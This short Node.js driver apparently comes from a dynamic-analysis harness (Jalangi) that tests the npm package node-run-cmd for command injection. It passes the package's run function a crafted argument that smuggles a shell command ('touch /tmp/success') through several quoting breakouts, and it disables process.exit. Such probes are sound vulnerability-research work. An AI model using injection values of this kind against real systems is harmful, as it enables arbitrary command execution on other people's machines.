// JALANGI DRIVER
process.backup_exit = process.exit;
process.exit = function(){console.log("Tried calling process.exit")};
    
var PUT = require('/nodetaint/packageData/node-run-cmd/node_modules/node-run-cmd');
try {
	var x0 = "?Z";
var x1 = " $(touch /tmp/success) # \" || touch /tmp/success # ' || touch /tmp/success";
new PUT["run"](x0,x1)();
} catch (e) {
	console.log(e);
}